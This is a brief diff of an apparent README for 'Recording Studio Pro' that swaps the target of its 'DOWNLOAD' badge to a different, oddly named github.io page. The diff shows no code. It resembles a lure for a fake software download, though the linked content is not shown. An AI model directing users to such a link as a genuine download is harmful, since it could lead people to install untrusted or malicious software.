@@ -2,7 +2,7 @@
 ### *Record, mix, and export your tracks with ease.*
 
 <p align="center">
-  <a href="https://trahendon.github.io/.github/RecordingStudioProInfoPC1" target="_blank">
+  <a href="https://jobbygomillertewebinfo1.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/⬇️ DOWNLOAD-RECORDING_STUDIO_PRO-0078d4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Recording Studio Pro" />
   </a>
 </p>
